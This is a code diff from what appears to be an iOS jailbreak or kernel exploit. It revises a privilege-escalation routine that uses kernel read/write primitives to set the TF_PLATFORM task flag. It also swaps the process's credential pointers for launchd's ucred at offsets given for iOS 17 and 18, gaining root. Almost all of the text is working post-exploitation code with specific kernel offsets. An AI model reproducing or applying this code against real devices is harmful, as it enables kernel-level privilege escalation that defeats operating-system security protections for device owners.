@@ -2112,73 +2112,57 @@ bool platformize_proc(void) {
     printf("[+] Our proc: 0x%llx\n", gOurProc);
     printf("[+] Our task: 0x%llx\n", gOurTask);
 
-    // 1. TF_PLATFORM in task->t_flags, ONLY if the base offset value is sane.
-    // The earlier auto-scan latched 0x318 whose content 0xd2fb3bc8 is clearly
-    // not t_flags (TF_INIT|TF_HAS_BSD_INFO missing) - writing TF_PLATFORM there
-    // would corrupt the task. We now trust 0x3DC ONLY when it looks right.
-    uint32_t tfOff = 0x3DC;
-    uint32_t t_flags = kread32(gOurTask + tfOff);
-    printf("[*] t_flags @ +0x%x, before: 0x%x\n", tfOff, t_flags);
-    bool flagsPlausible = ((t_flags & 0xA0000) == 0xA0000) &&
-                          (t_flags >> 28) == 0;
-    if (flagsPlausible && !(t_flags & TF_PLATFORM)) {
-        kwrite32(gOurTask + tfOff, t_flags | TF_PLATFORM);
-        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + tfOff));
-    } else if (!flagsPlausible) {
-        printf("[*] t_flags 0x%x @0x3dc not plausible; scanning 0x300..0x520 "
-               "for TF_INIT|TF_HAS_BSD_INFO (0xA0000) set\n", t_flags);
-        for (tfOff = 0x300; tfOff <= 0x520; tfOff += 4) {
-            uint32_t v = kread32(gOurTask + tfOff);
-            if ((v & 0xA0000) == 0xA0000 && (v >> 28) == 0) {
-                kwrite32(gOurTask + tfOff, v | TF_PLATFORM);
-                printf("[+] TF_PLATFORM set @+0x%x: 0x%x\n", tfOff, kread32(gOurTask + tfOff));
-                break;
-            }
+    // 1. TF_PLATFORM only if the 0x3DC offset actually contains a plausible flag
+    // set (TF_INIT|TF_HAS_BSD_INFO). Never write blindly. If it's already set or
+    // the base value is wrong, skip -- TF_PLATFORM isn't strictly needed.
+    uint32_t tf_flags_read = kread32(gOurTask + 0x3DC);
+    if ((tf_flags_read & 0xA0000) == 0xA0000 && (tf_flags_read >> 28) == 0) {
+        if (!(tf_flags_read & TF_PLATFORM)) {
+            kwrite32(gOurTask + 0x3DC, tf_flags_read | 0x400);
+            printf("[+] TF_PLATFORM set (0x3DC)\n");
+        } else {
+            printf("[*] TF_PLATFORM already set\n");
         }
     } else {
-        printf("[*] TF_PLATFORM already set\n");
+        printf("[*] t_flags@0x3DC=0x%x not plausible (skip TF_PLATFORM write)\n", tf_flags_read);
     }
 
-    // 2. uid/gid 0 in the REAL ucred (found via proc_ro field scan).
-    // 2. uid/gid 0: replace our proc's p_ucred with launchd's proven ucred.
-    // On iOS 18 (A14), zeroing our own ucred's POSIX fields does NOT change
-    // getuid() because the live credential is the *referenced* ucred (from
-    // proc->p_ucred at proc+0x10), not the snapshot in proc_ro. lara solves
-    // this with ds_kwrite64(proc+0x10, launchd_ucred). We do the same via
-    // find_proc_by_pid(1) -> sbx_ucredbyproc-style scan on launchd's proc_ro.
+    // 2. Replace our ucred with launchd's proven ucred.
+    // iOS 18 note: proc->p_ucred (proc+0x10) is the legacy fast-path slot used
+    // by a few BSD helpers, but the LIVE credential that matters for uid/gid
+    // checks is proc_ro->p_ucred (0x20 on iOS 17, 0x28 on iOS 18). Lara writes
+    // both (proc+0x10 + proc_ro+0x20) for iOS 16/17 compat; we additionally
+    // write proc_ro+0x28 to cover iOS 18, which otherwise returns old creds.
+    printf("[elev] finding launchd proc (pid 1)...\n");
     uint64_t launchdProc = find_proc_by_pid(1);
     if (!launchdProc) {
-        printf("[-] Cannot find launchd proc (pid 1)\n");
+        printf("[-] find_proc_by_pid(1) failed\n");
         return false;
     }
+    printf("[elev] launchd proc: 0x%llx\n", launchdProc);
+
     uint64_t launchdUcred = get_ucred_from_proc(launchdProc);
     if (!launchdUcred) {
-        printf("[-] Cannot find launchd ucred\n");
+        printf("[-] Could not read launchd ucred\n");
         return false;
     }
-    printf("[elev] launchd=0x%llx ucred=0x%llx\n", launchdProc, launchdUcred);
+    printf("[elev] launchd ucred: 0x%llx\n", launchdUcred);
 
-    // iOS 18: proc->p_ucred (proc+0x10) is a legacy alias used only by syscall
-    // entry fast-paths. The LIVE credential is proc_ro->p_ucred via
-    // off_proc_ro_p_ucred (=0x20 on iOS 16..17, 0x28 on iOS 18). Lara's elevate
-    // writes BOTH to be safe: ds_kwrite64(self_proc + 0x10, launchducred)
-    // (in16 fallback) AND proc_ro ucred slot.
-    uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
-    uint64_t ourUcredRo = kread_ptr(ourProcRo + 0x20); // off_proc_ro_p_ucred
     uint64_t ourUcredDirect = kread64(gOurProc + 0x10);
-    printf("[elev] ours: proc+0x10=0x%llx proc_ro=0x%llx proc_ro.ucred=0x%llx\n",
-           ourUcredDirect, ourProcRo, ourUcredRo);
+    uint64_t ourProcRo = kread_ptr(gOurProc + 0x18);
+    uint64_t ourUcredRo = kread_ptr(ourProcRo + 0x20);
+    uint64_t ourUcredRo18 = kread_ptr(ourProcRo + 0x28);
+    printf("[elev] ours (before): proc+0x10=0x%llx proc_ro.ucred(0x20)=0x%llx (0x28)=0x%llx\n",
+           ourUcredDirect, ourUcredRo, ourUcredRo18);
 
-    // Write BOTH slots: proc->p_ucred (fast path) + proc_ro->p_ucred (newer).
     kwrite64(gOurProc + 0x10, launchdUcred);
     if (looks_kernel(ourProcRo)) {
-        kwrite64(ourProcRo + 0x20, launchdUcred);   // iOS 17 offset
-        kwrite64(ourProcRo + 0x28, launchdUcred);   // iOS 18 offset
+        kwrite64(ourProcRo + 0x20, launchdUcred);   // iOS 17 shadow slot
+        kwrite64(ourProcRo + 0x28, launchdUcred);   // iOS 18 live slot
+        printf("[elev] wrote launchd ucred to proc+0x10, proc_ro+0x20, proc_ro+0x28\n");
     }
-    // zero out the POSIX uid/gid of our OWN ucred as well, in case the kernel
-    // reads cr_posix from either location (we can't know which it will pick).
-    printf("[*] replaced ucred everywhere; getuid=%d euid=%d\n", getuid(), geteuid());
 
+    printf("[elev] after: getuid=%d euid=%d\n", getuid(), geteuid());
     gOurUcred = launchdUcred;
     return true;
 }
